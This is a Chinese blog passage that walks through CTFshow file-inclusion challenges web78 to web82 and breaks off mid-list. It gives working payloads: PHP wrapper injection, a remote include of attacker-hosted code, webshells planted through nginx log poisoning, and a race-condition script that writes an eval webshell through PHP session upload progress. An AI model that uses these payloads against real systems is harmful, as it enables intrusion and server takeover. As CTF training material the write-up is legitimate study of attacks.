<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Xrntkk&#39;s Blog (Alt + H)">Xrntkk&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/" title="Xrntkk&#39;s Blog">
                    <span>首页📔</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/archives/" title="归档">
                    <span>归档🗃️</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="Tags">
                    <span>标签🔖</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="搜索">
                    <span>搜索🔎</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/links/" title="友链🎈">
                    <span>友链🎈</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/about/" title="关于">
                    <span>关于👨‍💻</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      CTFSHOW-文件包含-Writeup
    </h1>
<div class="post-meta"><span title='2024-12-22 00:27:55 +0800 CST'>2024-12-22</span>&nbsp;·&nbsp;37 分钟&nbsp;·&nbsp;Xrntkk

<div class="meta-item">&nbsp·&nbsp
  <span id="busuanzi_container_page_pv">Readings: <span id="busuanzi_value_page_pv"></span></span>
  </div>      
</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">目录</span>
        </summary>

        <div class="inner"><ul><ul>
                <li>
                    <a href="#web78" aria-label="Web78">Web78</a></li>
                <li>
                    <a href="#web79" aria-label="web79">web79</a></li>
                <li>
                    <a href="#web80" aria-label="web80">web80</a></li>
                <li>
                    <a href="#web81" aria-label="web81">web81</a></li>
                <li>
                    <a href="#web82" aria-label="web82">web82</a></li>
                <li>
                    <a href="#web83" aria-label="web83">web83</a></li>
                <li>
                    <a href="#web84" aria-label="web84">web84</a></li>
                <li>
                    <a href="#web85" aria-label="web85">web85</a></li>
                <li>
                    <a href="#web86" aria-label="web86">web86</a></li>
                <li>
                    <a href="#web87" aria-label="web87">web87</a><ul>
                        
                <li>
                    <a href="#phpfilter%e7%9a%84%e4%bd%bf%e7%94%a8" aria-label="php://filter的使用">php://filter的使用</a></li></ul>
                </li>
                <li>
                    <a href="#web88" aria-label="web88">web88</a></li>
                <li>
                    <a href="#web116" aria-label="web116">web116</a></li>
                <li>
                    <a href="#web117" aria-label="web117">web117</a></li></ul>
                    
                <li>
                    <a href="#php%e7%89%b9%e6%80%a7" aria-label="php特性">php特性</a><ul>
                        
                <li>
                    <a href="#web89" aria-label="web89">web89</a><ul>
                        
                <li>
                    <a href="#preg_match%e5%87%bd%e6%95%b0" aria-label="preg_match函数：">preg_match函数：</a></li>
                <li>
                    <a href="#intval%e5%87%bd%e6%95%b0" aria-label="intval函数:">intval函数:</a></li></ul>
                </li>
                <li>
                    <a href="#web90" aria-label="web90">web90</a></li>
                <li>
                    <a href="#web91" aria-label="web91">web91</a><ul>
                        
                <li>
                    <a href="#phpim-%e7%9a%84%e5%90%ab%e4%b9%89" aria-label="/^php$/im 的含义">/^php$/im 的含义</a></li></ul>
                </li>
                <li>
                    <a href="#web92" aria-label="web92">web92</a></li>
                <li>
                    <a href="#web93" aria-label="web93">web93</a></li>
                <li>
                    <a href="#web94" aria-label="web94">web94</a><ul>
                        
                <li>
                    <a href="#strops%e5%87%bd%e6%95%b0%e7%bb%95%e8%bf%87" aria-label="strops函数绕过：">strops函数绕过：</a></li></ul>
                </li>
                <li>
                    <a href="#web95" aria-label="web95">web95</a></li>
                <li>
                    <a href="#web96" aria-label="web96">web96</a></li>
                <li>
                    <a href="#web97" aria-label="web97">web97</a></li>
                <li>
                    <a href="#web98" aria-label="web98">web98</a></li>
                <li>
                    <a href="#web99" aria-label="web99">web99</a></li>
                <li>
                    <a href="#web100" aria-label="web100">web100</a></li>
                <li>
                    <a href="#web101" aria-label="web101">web101</a></li>
                <li>
                    <a href="#web102" aria-label="web102">web102</a></li>
                <li>
                    <a href="#web103" aria-label="web103">web103</a></li>
                <li>
                    <a href="#web104" aria-label="web104">web104</a></li>
                <li>
                    <a href="#web105" aria-label="web105">web105</a></li>
                <li>
                    <a href="#web106" aria-label="web106">web106</a></li>
                <li>
                    <a href="#web107" aria-label="web107">web107</a></li>
                <li>
                    <a href="#web108" aria-label="web108">web108</a></li>
                <li>
                    <a href="#web109" aria-label="web109">web109</a></li>
                <li>
                    <a href="#web110" aria-label="web110">web110</a></li>
                <li>
                    <a href="#web111" aria-label="web111">web111</a></li>
                <li>
                    <a href="#web112" aria-label="web112">web112</a></li>
                <li>
                    <a href="#web113" aria-label="web113">web113</a></li>
                <li>
                    <a href="#web114" aria-label="web114">web114</a></li>
                <li>
                    <a href="#web115" aria-label="web115">web115</a></li>
                <li>
                    <a href="#web123" aria-label="web123">web123</a></li>
                <li>
                    <a href="#web125" aria-label="web125">web125</a></li>
                <li>
                    <a href="#web126" aria-label="web126">web126</a></li>
                <li>
                    <a href="#web127" aria-label="web127">web127</a></li>
                <li>
                    <a href="#web128" aria-label="web128">web128</a></li>
                <li>
                    <a href="#web129" aria-label="web129">web129</a></li>
                <li>
                    <a href="#web130" aria-label="web130">web130</a></li>
                <li>
                    <a href="#web131" aria-label="web131">web131</a></li>
                <li>
                    <a href="#web132" aria-label="web132">web132</a></li>
                <li>
                    <a href="#web133" aria-label="web133">web133</a></li>
                <li>
                    <a href="#web134" aria-label="web134">web134</a></li>
                <li>
                    <a href="#web135" aria-label="web135">web135</a></li>
                <li>
                    <a href="#web136" aria-label="web136">web136</a></li></ul>
                </li>
                <li>
                    <a href="#linux-tee%e5%91%bd%e4%bb%a4%e4%bb%8b%e7%bb%8d" aria-label="Linux tee命令介绍">Linux tee命令介绍</a><ul>
                        
                <li>
                    <a href="#web137" aria-label="web137">web137</a></li>
                <li>
                    <a href="#web138" aria-label="web138">web138</a></li>
                <li>
                    <a href="#web139" aria-label="web139">web139</a></li>
                <li>
                    <a href="#web140" aria-label="web140">web140</a></li>
                <li>
                    <a href="#web141" aria-label="web141">web141</a></li>
                <li>
                    <a href="#web142" aria-label="web142">web142</a></li>
                <li>
                    <a href="#web143" aria-label="web143">web143</a></li>
                <li>
                    <a href="#web144" aria-label="web144">web144</a></li>
                <li>
                    <a href="#web145" aria-label="web145">web145</a></li>
                <li>
                    <a href="#web146" aria-label="web146">web146</a></li>
                <li>
                    <a href="#web147" aria-label="web147">web147</a></li>
                <li>
                    <a href="#web148" aria-label="web148">web148</a></li>
                <li>
                    <a href="#web149" aria-label="web149">web149</a></li>
                <li>
                    <a href="#web150" aria-label="web150">web150</a></li>
                <li>
                    <a href="#web150plus" aria-label="web150plus">web150plus</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><blockquote>
<p>以PHP为例,常用的文件包含函数有以下四种include(),require(),include_once(),require_once()</p></blockquote>
<h4 id="web78">Web78<a hidden class="anchor" aria-hidden="true" href="#web78">#</a></h4>
<p>php伪协议</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 10:52:43
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-16 10:54:20
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>payload:</p>
<blockquote>
<p>?file=data://text/plain,<?php system("cat flag.php")?></p></blockquote>
<p>查看源代码，得到flag</p>
<p><img alt="image-20241121192438056" loading="lazy" src="../assets/image-20241121192438056.png"></p>
<h4 id="web79">web79<a hidden class="anchor" aria-hidden="true" href="#web79">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:10:14
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-16 11:12:38
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题相对于上一题会将file中的php替换为???</p>
<p>我们可以通过base64进行绕过</p>
<pre tabindex="0"><code>?file=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=
</code></pre><p>or</p>
<pre tabindex="0"><code>?file=data://text/plain,&lt;?=system(&#39;tac flag*&#39;);?&gt; 

?file=data://text/plain,&lt;?Php echo `tac f*`;?&gt;
</code></pre><p>or</p>
<p>远程加载</p>
<blockquote>
<p>加载robots.txt，发现可以回显</p>
<p>在自己vps上创建1.txt，内容如下 <code>&lt;?php system(&quot;tac flag.php&quot;);?&gt;</code></p>
<p>起一个http服务，加载 <code>url/?file=http://x.x.x.x:7001/1.txt</code></p></blockquote>
<p>or</p>
<p>input协议 大小写绕过</p>
<p>payload:</p>
<pre tabindex="0"><code>POST /?file=Php://input HTTP/1.1

&lt;?Php system(&#34;cat flag.php&#34;);?&gt;
</code></pre><h4 id="web80">web80<a hidden class="anchor" aria-hidden="true" href="#web80">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-16 11:26:29
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm"> 
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"> 
</span></span><span class="line"><span class="ln">14</span><span class="cl"> 
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$file </span><span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$file </span><span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nv">$file </span><span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;data&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>日志包含</p>
<p>写入一句话木马</p>
<p><img alt="image-20241121201547420" loading="lazy" src="../assets/image-20241121201547420.png"></p>
<p>连webshell工具或者直接get传参</p>
<pre tabindex="0"><code>?file=/var/log/nginx/access.log&amp;2=system(&#39;ls /var/www/html&#39;);phpinfo();

?file=/var/log/nginx/access.log&amp;2=system(&#39;tac /var/www/html/fl0g.php&#39;);phpinfo();
</code></pre><p>Or</p>
<p>input协议 大小写绕过</p>
<p>payload:</p>
<pre tabindex="0"><code>POST /?file=Php://input HTTP/1.1

&lt;?Php system(&#34;cat flag.php&#34;);?&gt;
</code></pre><p><img alt="image-20241121202826975" loading="lazy" src="../assets/image-20241121202826975.png"></p>
<h4 id="web81">web81<a hidden class="anchor" aria-hidden="true" href="#web81">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-16 15:51:31
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm"> 
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="nv">$file </span><span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$file </span><span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$file </span><span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;data&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$file </span><span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>同上web80</p>
<h4 id="web82">web82<a hidden class="anchor" aria-hidden="true" href="#web82">#</a></h4>
<p>条件竞争</p>
<p>poc</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">import</span> <span class="nx">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">import</span> <span class="nx">io</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">import</span> <span class="nx">threading</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nx">url</span><span class="o">=</span><span class="s1">&#39;http://9a77fcb3-6f3c-4bd6-a247-07bfe6766509.challenge.ctf.show:8080/&#39;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">sessionid</span><span class="o">=</span><span class="s1">&#39;ctfshow&#39;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="nx">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">	<span class="s2">&#34;1&#34;</span><span class="o">:</span><span class="s2">&#34;file_put_contents(&#39;/var/www/html/jiuzhen.php&#39;,&#39;&lt;?php eval(</span><span class="si">$_POST[3]</span><span class="s2">);?&gt;&#39;);&#34;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="c1">#这个是访问/tmp/sess_ctfshow时，post传递的内容，是在网站目录下写入一句话木马。这样一旦访问成功，就可以蚁剑连接了。
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="c1"></span><span class="nx">def</span> <span class="nx">write</span><span class="p">(</span><span class="nx">session</span><span class="p">)</span><span class="o">:</span><span class="c1">#/tmp/sess_ctfshow中写入一句话木马。
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="c1"></span>	<span class="nx">fileBytes</span> <span class="o">=</span> <span class="nx">io</span><span class="o">.</span><span class="nx">BytesIO</span><span class="p">(</span><span class="nx">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">1024</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">	<span class="k">while</span> <span class="k">True</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">		<span class="nx">response</span><span class="o">=</span><span class="nx">session</span><span class="o">.</span><span class="nx">post</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">			<span class="nx">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">			<span class="s1">&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</span><span class="o">:</span><span class="s1">&#39;&lt;?php eval($_POST[1]);?&gt;&#39;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">			<span class="p">},</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">			<span class="nx">cookies</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">			<span class="s1">&#39;PHPSESSID&#39;</span><span class="o">:</span><span class="nx">sessionid</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">			<span class="p">},</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">			<span class="nx">files</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">			<span class="s1">&#39;file&#39;</span><span class="o">:</span><span class="p">(</span><span class="s1">&#39;ctfshow.jpg&#39;</span><span class="p">,</span><span class="nx">fileBytes</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">			<span class="p">)</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="nx">def</span> <span class="nx">read</span><span class="p">(</span><span class="nx">session</span><span class="p">)</span><span class="o">:</span><span class="c1">#访问/tmp/sess_ctfshow，post传递信息，在网站目录下写入木马。
</span></span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="c1"></span>	<span class="k">while</span> <span class="k">True</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">		<span class="nx">response</span><span class="o">=</span><span class="nx">session</span><span class="o">.</span><span class="nx">post</span><span class="p">(</span><span class="nx">url</span><span class="o">+</span><span class="s1">&#39;?file=/tmp/sess_&#39;</span><span class="o">+</span><span class="nx">sessionid</span><span class="p">,</span><span class="nx">data</span><span class="o">=</span><span class="nx">data</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">			<span class="nx">cookies</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">			<span class="s1">&#39;PHPSESSID&#39;</span><span class="o">:</span><span class="nx">sessionid</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">			<span class="p">)</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">		<span class="nx">resposne2</span><span class="o">=</span><span class="nx">session</span><span class="o">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">url</span><span class="o">+</span><span class="s1">&#39;jiuzhen.php&#39;</span><span class="p">);</span><span class="c1">#访问木马文件，如果访问到了就代表竞争成功
</span></span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="nx">resposne2</span><span class="o">.</span><span class="nx">status_code</span><span class="o">==</span><span class="mi">200</span><span class="o">:</span><span class="nx">了</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">			<span class="k">print</span><span class="p">(</span><span class="s1">&#39;++++++done++++++&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">		<span class="k">else</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">			<span class="k">print</span><span class="p">(</span><span class="nx">resposne2</span><span class="o">.</span><span class="nx">status_code</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">
</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="k">if</span> <span class="nx">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">
</span></span><span class="line"><span class="ln">41</span><span class="cl">	<span class="nx">evnet</span><span class="o">=</span><span class="nx">threading</span><span class="o">.</span><span class="nx">Event</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">	<span class="c1">#写入和访问分别设置5个线程。
</span></span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="c1"></span>	<span class="nx">with</span> <span class="nx">requests</span><span class="o">.</span><span class="nx">session</span><span class="p">()</span> <span class="k">as</span> <span class="nx">session</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">		<span class="k">for</span> <span class="nx">i</span> <span class="nx">in</span> <span class="nx">range</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">			<span class="nx">threading</span><span class="o">.</span><span class="nx">Thread</span><span class="p">(</span><span class="nx">target</span><span class="o">=</span><span class="nx">write</span><span class="p">,</span><span class="nx">args</span><span class="o">=</span><span class="p">(</span><span class="nx">session</span><span class="p">,))</span><span class="o">.</span><span class="nx">start</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">		<span class="k">for</span> <span class="nx">i</span> <span class="nx">in</span> <span class="nx">range</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">			<span class="nx">threading</span><span class="o">.</span><span class="nx">Thread</span><span class="p">(</span><span class="nx">target</span><span class="o">=</span><span class="nx">read</span><span class="p">,</span><span class="nx">args</span><span class="o">=</span><span class="p">(</span><span class="nx">session</span><span class="p">,))</span><span class="o">.</span><span class="nx">start</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">
</span></span><span class="line"><span class="ln">49</span><span class="cl">	<span class="nx">evnet</span><span class="o">.</span><span class="nx">set</span><span class="p">()</span>
</span></span></code></pre></div><p><img alt="image-20241123014155194" loading="lazy" src="assets/image-20241123014155194.png"></p>
<p>getshell</p>
<p><img alt="image-20241123014312621" loading="lazy" src="assets/image-20241123014312621.png"></p>
<p>直接查flag</p>
<p><strong>利用条件</strong></p>
<blockquote>
<ol>
